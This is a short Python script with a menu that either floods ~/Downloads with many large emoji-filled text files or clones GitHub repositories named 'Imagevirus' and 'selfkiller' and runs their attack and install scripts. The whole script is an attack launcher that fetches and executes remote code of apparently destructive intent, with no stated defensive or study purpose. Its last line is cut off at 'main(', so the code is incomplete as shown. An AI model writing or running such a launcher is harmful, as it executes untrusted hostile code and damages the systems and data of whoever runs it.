import os
import subprocess

def create_files():
    num_files = int(input("Enter the number of files: "))
    folder_name = "new_folder"
    folder_path = os.path.join(os.path.expanduser("~/Downloads"), folder_name)
    os.makedirs(folder_path, exist_ok=True)
    for i in range(num_files):
        file_name = f"file_{i+1}.txt"
        file_path = os.path.join(folder_path, file_name)
        with open(file_path, "w") as f:
            f.write("😊" * 10000)

def run_imagevirus():
    subprocess.run(["git", "clone", "https://github.com/AloneStandLarkaAnas/Imagevirus.git"])
    os.chdir("Imagevirus")
    subprocess.run(["python", "attack.py"])

def run_selfkiller():
    subprocess.run(["git", "clone", "https://github.com/GH05T-HUNTER5/selfkiller.git"])
    os.chdir("selfkiller")
    subprocess.run(["chmod", "+x", "selfkiller"])
    subprocess.run(["python3", "install.py"])
    subprocess.run(["python3", "install.py"])
    subprocess.run(["./selfkiller"])

def main():
    print("Select an option:")
    print("1. Create files")
    print("2. Run Imagevirus")
    print("3. Run Selfkiller")
    option = input("Enter your choice: ")
    if option == "1":
        create_files()
    elif option == "2":
        run_imagevirus()
    elif option == "3":
        run_selfkiller()
    else:
        print("Invalid option")

if __name__ == "__main__":
    main(
